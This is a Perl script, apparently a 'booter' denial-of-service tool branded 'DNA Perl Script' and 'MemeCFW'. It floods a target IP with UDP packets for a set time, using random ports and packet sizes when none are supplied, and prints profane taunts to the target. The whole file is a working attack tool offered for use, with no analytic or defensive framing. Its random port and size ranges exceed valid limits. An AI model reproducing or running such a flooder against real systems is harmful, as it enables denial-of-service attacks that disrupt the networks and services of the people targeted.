#!/usr/bin/perl
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
print BOLD RED "IP\n";
print BOLD YELLOW "port\n";
print BOLD GREEN "packets";
print BOLD BLACK  "seconds\n";
 
############
# DNA
############
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print BOLD BLUE<<EOTEXT;
6098)o%:::%o(860
098)o%:::%o(8609
 6o%:%o(86098)
  (86098)o
6098)o%::%o9
098)o%::::::%o9
 6o%::::::%o(860
    6o%::%o(8609
      o(86098)
  (86098)o%:%o9
6098)o%:::%o(860
098)o%:::%o(8609
 6o%:%o(86098)
  (86098)o
6098)o%::%o9
098)o%::::::%o9
 6o%::::::%o(860
    6o%::%o(8609
      o(86098)
  (86098)o%:%o9
6098)o%:::%o(860
098)o%:::%o(8609
 6o%:%o(86098)
  (86098)o
6098)o%::%o9
098)o%::::::%o9
 6o%::::::%o(860
    6o%::%o(8609
      o(86098)
  (86098)o%:%o9
6098)o%:::%o(860
098)o%:::%o(8609
 6o%:%o(86098)
  (86098)o
6098)o%::%o9
098)o%::::::%o9
 6o%::::::%o(860
    6o%::%o(8609
      o(86098)
  (86098)o%:%o9
6098)o%:::%o(860
EOTEXT


print BOLD RED<<EOTEXT;
*Don't Flex*
*DNA Perl Script*
*Custom*
EOTEXT
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
print "~ MemeCFW just dropped your shit~ $ip " . ($port ? $port : "random") . "-" .
  ($size ? "$size-byte" : "Get No Routed Bitch!?") . "
~ Get Ran Bitch
~ #Nulled ~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;  
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
 $iaddr));}       